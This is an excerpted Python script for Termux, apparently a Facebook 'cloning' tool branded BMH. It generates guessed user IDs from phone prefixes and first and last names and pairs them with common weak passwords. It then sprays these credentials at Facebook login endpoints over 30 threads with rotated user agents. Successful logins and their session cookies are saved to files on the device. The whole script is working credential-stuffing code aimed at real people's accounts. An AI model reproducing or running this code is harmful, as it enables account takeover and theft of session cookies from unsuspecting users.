...
try:
    os.system("clear")
    print(' \n\x1b[1;92mChecking server...\x1b[1;97m\n')
...
def main():
    ...
    print(XYTEEE)
    pi()
    print(' [1] Cloning Gmail')
    print(' [0] Exit Tool BMH')
    print('\033[1;37m-----------------------------------------------------')
...
def xk():
    ...
    print(XYTEEE)
    pi()
    print("\x1b[1;91m 92301 92302 92303 92305\n\x1b[1;97m-----------------------------------------------------")
    ...
    with ThreadPool(max_workers=30) as manshera:
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid,'khankhan','khan123','khan1122']
    ...
    print('\x1b[1;97m-----------------------------------------------------')
    input(f' Press Enter To Back ');os.system("clear");main()
#--------------------BD--------------------•
def nx():
    os.system("clear")
    print(XYTEEE)
...
def nams():
    ...
    clear()
    print('\033[1;37m Example : \033[1;31mkawsar, rakibul, ariya, sadiya\033[1;97m')
    print('\x1b[1;97m-----------------------------------------------------')
...
def gmail():
    os.system('rm -rf .re.txt')
    clear()
    print('\033[1;37m Example : \033[1;31maung, aung, zaw, \033[1;97m')
    print('\x1b[1;97m-----------------------------------------------------')
    first = input(' Put first name : ')
    clear()
    print('\033[1;37m Example : \033[1;31myint, oo, win, min \033[1;97m')
    print('\x1b[1;97m-----------------------------------------------------')
    last = input(' Put last name : ')
    clear()
...
def xyte(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f"\r\x1b[1;97m [BMH] {loop} | OK/CP {len(ok)}/{len(cp)} | [{'{:.1%}'.format(loop/int(tl))}]\r"),
            sys.stdout.flush()
	    ...
	    "referer": "https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ferror%2Findex.php%3Ferr%3Dec%26kerr%3D1357001%26kerr_summary%3DLogin%2Buntuk%2Bmelanjutkan%26kerr_description%3DLogin%2Bke%2Bakun%2BAnda.&ref=104&refsrc=deprecated",
	    "accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",}
            link = session.get("https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ferror%2Findex.php%3Ferr%3Dec%26kerr%3D1357001%26kerr_summary%3DLogin%2Buntuk%2Bmelanjutkan%26kerr_description%3DLogin%2Bke%2Bakun%2BAnda.&ref=104&refsrc=deprecated",headers=HEAD1,allow_redirects=True)
            DATA = {
	    ...
	    "accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",}
            lo = session.post("https://www.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fm.facebook.com%2Ferror%2Findex.php%3Ferr%3Dec%26kerr%3D1357001%26kerr_summary%3DLogin%2Buntuk%2Bmelanjutkan%26kerr_description%3DLogin%2Bke%2Bakun%2BAnda.&refsrc=deprecated&lwv=100&refid=9&ref=104",data=DATA,headers=HEAD2,allow_redirects=True)
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                cid = "1000"+coki1[0:11]
                print('\x1b[1;92m [BMH-OK] '+uid+' | '+ps+' ')
                print('\r\x1b[1;97m Cookies :\033[0;92m '+coki)
                open('/sdcard/BMH-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ok.append(cid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    cid=coki[24:39]
                    #print('\r\x1b[38;5;208m[BMH-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                    open('/sdcard/BMH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki1 = coki.split("1000")[1]
                cid = "1000"+coki1[0:11]
                print('\x1b[1;92m [BMH-OK] '+cid+' | '+ps+' ')
                print('\r\x1b[1;97m Cookies :\033[0;92m '+coki)
                open('/sdcard/BMH-COOKIES.txt', 'a').write(coki+'\n')
                open('/sdcard/BMH-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ok.append(cid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def numb(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f"\r\x1b[1;97m [BMH-MYANMAR] {loop} | OK/CP {len(ok)}/{len(cp)} | [{'{:.1%}'.format(loop/int(tl))}]\r"),
            sys.stdout.flush()
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/BMH-COOKIES.txt', 'a').write(coki+'\n')
                open('/sdcard/BMH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    cid=coki[24:39]
...
def rndm(ids,passlist,total):
    ...
    try:
        for pas in passlist:
            sys.stdout.write(f"\r\x1b[1;97m [BMH-MYANMAR] {loop} | OK/CP {len(oks)}/{len(cps)} | [{'{:.1%}'.format(loop/int(total))}]\r"),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            ...
            if "c_user" in log_cookies:
                ...
                print('\x1b[1;92m [BMH-OK] '+ids+' | '+pas+'')
                print('\r\x1b[1;97m Cookies :\033[0;92m '+kuki)
                open('/sdcard/BMH-COOKIES.txt', 'a').write(kuki+'\n\n')
                ...
                oks.append(ids)
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    print(f'\r\x1b[38;5;208m [BMH-CP] ' +ids+ ' | ' +pas+           '  \33[0;97m')
